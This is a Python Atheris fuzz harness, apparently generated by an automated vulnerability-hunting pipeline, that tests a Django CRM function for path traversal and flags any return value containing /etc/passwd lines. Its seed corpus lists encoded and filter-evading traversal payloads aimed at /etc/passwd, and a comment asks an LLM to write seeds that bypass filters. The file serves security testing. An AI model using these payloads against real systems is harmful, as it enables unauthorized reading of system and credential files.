import atheris
import sys
import re
import os



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/vc-codex-high-seeded-v2-crm-saas-django"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from config.partner_console import acct_vaultlet_pull_062


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("root:x:0:0", re.IGNORECASE),

    re.compile("nobody:x:", re.IGNORECASE),

    re.compile("daemon:x:", re.IGNORECASE),

    re.compile("bin:x:", re.IGNORECASE),

    re.compile("sys:x:", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_PATH-INJECTION: path traversal bypass confirmed — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "request", "index": 0, "type": "HttpRequest"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : return_value
# patch_target     : None
# target_arg_index : None
# target_arg_name  : None
# input_strategy   : direct_params
# signature        : def acct_vaultlet_pull_062(request)
# condition        : The return value contains contents from /etc/passwd (e.g. root:x:0:0), confirming that a path traversal payload in packet_ref bypassed the absent sanitization and read an arbitrary file outside BASE_EXPORT_DIR
# capture_what     : return value of acct_vaultlet_pull_062, which contains file contents read via parcel_path.read_text()
# skip_hint        : False
# ========================================


# === RETURN_VALUE SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Call target function directly and capture the return value.
# 4. Extract string content from the return value (based on capture_what).
# 5. Compare captured string against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    payload = fdp.ConsumeBytes(2048).decode('utf-8', errors='ignore')
    
    if not payload:
        return
    
    class FakeRequest:
        def __init__(self, packet_ref):
            self.GET = {'packet_ref': packet_ref}
            self.POST = {}
            self.FILES = {}
            self.META = {}
            self.method = 'GET'
            self.session = {}
            self.user = type('FakeUser', (object,), {
                'is_authenticated': True,
                'id': 1,
                'username': 'testuser',
            })()
    
    request = FakeRequest(payload)
    
    try:
        result = acct_vaultlet_pull_062(request)
    except RuntimeError:
        raise
    except Exception:
        return
    
    if result is None:
        return
    
    if not isinstance(result, str):
        try:
            result = str(result)
        except Exception:
            return
    
    for pattern in _COMPILED_PATTERNS:
        match = pattern.search(result)
        if match:
            raise RuntimeError(_RAISE_MESSAGE.format(
                captured=result[:200],
                matched_pattern=match.pattern
            ))



# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    "../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..././..././..././etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "..%5c..%5c..%5cetc%5cpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "../../etc/passwd%00.jpg",
    "..//..//..//etc//passwd",
    "/../../../../../../etc/passwd",
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/vc-codex-high-seeded-v2-crm-saas-django/fuzz_corpus/py_path_injection_config_partner_console_py_42"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                if isinstance(_seed, bytes):
                    _f.write(_seed)
                else:
                    _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()